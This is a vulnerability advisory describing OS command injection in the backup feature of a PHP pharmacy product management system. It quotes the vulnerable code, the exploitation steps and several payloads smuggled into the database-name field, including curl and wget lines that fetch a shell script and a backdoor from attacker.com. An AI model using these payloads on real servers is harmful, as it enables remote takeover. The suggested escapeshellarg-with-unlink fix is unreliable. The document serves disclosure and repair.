




# Title: [rce] in [Web-based Pharmacy Product Management System] <= [v1.0]

**BUG_Author:** [yaklang. io, IRify, Yakit]

## Product Information
- **Vendor Homepage:** [link](https://www.sourcecodester.com/php/17883/web-based-product-alert-system.html)
- **Software Link:** [download-link](https://www.sourcecodester.com/sites/default/files/download/Senior%20Walter/product_expiry.zip)
- **Affected Version:** [<= v1.0]
- **BUG Author:** yaklang. io, IRify 

## Vulnerability Details
### Vulnerable Files
- `backup.php`

### Vulnerability Type


### Root Cause

`backup.php` file： 
```php
	if(isset($_POST['btnbackup'])){
		//get credentails via post
		$servername_db = $_POST['txtservername'];
		$username_db = $_POST['txtusername'];
		$password_db = $_POST['txtpassword'];
		$dbname_db = $_POST['txtdbname'];
		echo "enter backup function";
		//backup and dl using our function
		backDb($servername_db, $username_db, $password_db, $dbname_db);

```
in `function_backup.php` ：
```php
	function backDb($host, $user, $pass, $dbname, $tables = '*'){
		//make db connection
		$conn = new mysqli($host, $user, $pass, $dbname);
		if ($conn->connect_error) {
		    die("Connection failed: " . $conn->connect_error);
		}

		//get all of the tables
		if($tables == '*'){
			$tables = array();
			$sql = "SHOW TABLES";
			$query = $conn->query($sql);
			while($row = $query->fetch_row()){
				$tables[] = $row[0];
			}
		}
		else{
			$tables = is_array($tables) ? $tables : explode(',',$tables);
		}

		//getting table structures
		$outsql = '';
		foreach ($tables as $table) {
    
		    // Prepare SQLscript for creating table structure
		    $sql = "SHOW CREATE TABLE $table";
		    $query = $conn->query($sql);
		    $row = $query->fetch_row();
		    
		    $outsql .= "\n\n" . $row[1] . ";\n\n";
		    
		    $sql = "SELECT * FROM $table";
		    $query = $conn->query($sql);
		    
		    $columnCount = $query->field_count;

		    // Prepare SQLscript for dumping data for each table
		    for ($i = 0; $i < $columnCount; $i ++) {
		        while ($row = $query->fetch_row()) {
		            $outsql .= "INSERT INTO $table VALUES(";
		            for ($j = 0; $j < $columnCount; $j ++) {
		                $row[$j] = $row[$j];
		                
		                if (isset($row[$j])) {
		                    $outsql .= '"' . $row[$j] . '"';
		                } else {
		                    $outsql .= '""';
		                }
		                if ($j < ($columnCount - 1)) {
		                    $outsql .= ',';
		                }
		            }
		            $outsql .= ");\n";
		        }
		    }
		    
		    $outsql .= "\n"; 
		}

		// Save the SQL script to a backup file
	    $backup_file_name = $dbname . '/_backup.sql';

	    $fileHandler = fopen($backup_file_name, 'w+');
	    fwrite($fileHandler, $outsql);
	    fclose($fileHandler);

	    // Download the SQL backup file to the browser
	    header('Content-Description: File Transfer');
	    header('Content-Type: application/octet-stream');
	    header('Content-Disposition: attachment; filename=' . basename($backup_file_name));
	    header('Content-Transfer-Encoding: binary');
	    header('Expires: 0');
	    header('Cache-Control: must-revalidate');
	    header('Pragma: public');
	    header('Content-Length: ' . filesize($backup_file_name));
	    ob_clean();
	    flush();
readfile($backup_file_name);
	    exec('rm ' . $backup_file_name);

```

We can control all function argument, so we want to control ` exec('rm ' . $backup_file_name);` 
```php
		$dbname_db = $_POST['txtdbname'];
		// ... 
		backDb($servername_db, $username_db, $password_db, $dbname_db);
		
		// in backDB: 
		$conn = new mysqli($host, $user, $pass, $dbname);
		if ($conn->connect_error) {
		    die("Connection failed: " . $conn->connect_error);
		}
		// ... 
		
		// Save the SQL script to a backup file
	    $backup_file_name = $dbname . '/_backup.sql';

	    $fileHandler = fopen($backup_file_name, 'w+');
	    fwrite($fileHandler, $outsql);
	    fclose($fileHandler);
		// ... 
	    exec('rm ' . $backup_file_name);
```

So we set `$host/$user/$pass` to my own database, and set `$dataname` to payload. We can pass `mysqli`. Then we use `.\arst\..\a` just to `.\a` so we can pass `fopen`, then we use `.\;xx;\..\a` we can run command in `xx`. 

### Impact

### Vulnerability Details:
1. The backup functionality in `backup.php` has multiple critical flaws:
   - Accepts unvalidated user input for database credentials (`txtservername`, `txtusername`, `txtpassword`, `txtdbname`)
   - Directly interpolates user-controlled `$dbname` into file path construction
   - Passes unsanitized file path to `exec()` call for file deletion

2. The vulnerability stems from trusting user input in:
   - Database connection parameters
   - File path construction
   - System command execution

### Attack Vectors:
1. Attacker sets up rogue MySQL server
2. Submits specially crafted POST request with:
   - Legitimate server credentials to bypass connection check
   - Malicious dbname parameter containing OS command injection payload

3. Attack flow:
   - Connects to attacker-controlled database
   - Creates file with crafted path containing commands
   - Executes malicious commands during cleanup phase

### Attack Payload Examples:
```
txtdbname=validDB;\$(malicious_command>output.txt)
txtdbname=/tmp;curl${IFS}attacker.com/shell.sh${IFS}-oC2
txtdbname=/var/www/html/;wget${IFS}http://attacker.com/backdoor.php
txtdbname=./x||command||/../ 
```

## Code Scan 

this vulnerability find by [IRify](ssa.to) :

![image.png](https://s2.loli.net/2025/04/02/ujGKOY7dLMvD1tn.png)



## Proof of Concept


### Technical Analysis:
1. The vulnerability chain exploits:
   - MySQL connection success requirements
   - Path normalization quirks in filesystem operations
   - Command injection via semicolon/parameter substitution

2. Server-specific considerations:
   - Works on both Windows (`&` command separator) and Unix (`;` separator) systems
   - Environment variable substitution via `${IFS}` bypasses space filtering


this valnerability validation by [Yakit](https://www.yaklang.io/)

For skip mysql connect and file open, we use my own mysql database and db nam: `./xx||command||/../` 
> In windows so we use `||` 
![image.png](https://s2.loli.net/2025/04/02/csgzNIqvkipdZoj.png)
We use `curl www.example.com -o example.txt` send request and downlaod web page  like this : 
![image.png](https://s2.loli.net/2025/04/02/YaUZDoGsAxOdly4.png)



## Suggested Repairs

### Immediate Fixes:
1. **Input Validation**:
   ```php
   $dbname = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['txtdbname']);
   ```

2. **Secure Path Construction**:
   ```php
   $backup_dir = '/secured_backups/';
   $backup_file_name = realpath($backup_dir).DIRECTORY_SEPARATOR.basename($dbname).'.sql';
   ```

3. **Command Execution Hardening**:
   ```php
   // Replace exec() call with:
   unlink(escapeshellarg($backup_file_name));
   ```
